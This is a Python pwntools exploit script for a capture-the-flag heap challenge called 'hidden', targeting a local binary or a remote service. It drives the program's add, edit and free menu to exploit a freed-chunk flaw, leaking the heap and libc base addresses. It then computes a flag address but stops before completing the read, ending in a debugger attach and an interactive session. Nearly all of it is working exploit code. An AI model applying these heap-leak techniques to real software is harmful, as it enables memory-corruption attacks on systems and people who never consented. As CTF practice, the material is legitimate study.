#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    with open('/flag.txt', 'wb') as f:
        f.write('flag{test}')
    p = process('./hidden')
else:
    p = remote('172.20.49.114', 8888)

def choice(c):
    p.recvuntil('Input your choice: \n')
    p.send(str(c).zfill(4))

def add(idx):
    choice(1)
    p.recvuntil('Input the idx\n')
    p.send(str(idx).zfill(4))

def edit(idx, content):
    choice(2)
    p.recvuntil('Input the idx\n')
    p.send(str(idx).zfill(4))
    p.recvuntil('Input the mark\n')
    p.send(content)

def free(idx):
    choice(3)
    p.recvuntil('Input the idx\n')
    p.send(str(idx).zfill(4))

# Leak Heap Base
add(0)
add(1)
free(0)
free(1)
edit(1, '\n')
p.recvuntil('Mark begin:')
heap_base = u64(p.recvuntil(' Mark end\n', drop=True).ljust(8, '\x00')) - 0x0a
info('heap_base = ' + hex(heap_base))
edit(1, 'A'*7+'\n')
p.recvuntil('Mark begin:'+'A'*7+'\n')
libc_base = u64(p.recvuntil(' Mark end\n', drop=True).ljust(8, '\x00')) - 0x3c4b78
info('libc_base = ' + hex(libc_base))
#gdb.attach(p)

# Leak Flag
flag_offset = 0x230
flag_addr = heap_base + flag_offset
gdb.attach(p)

p.interactive()

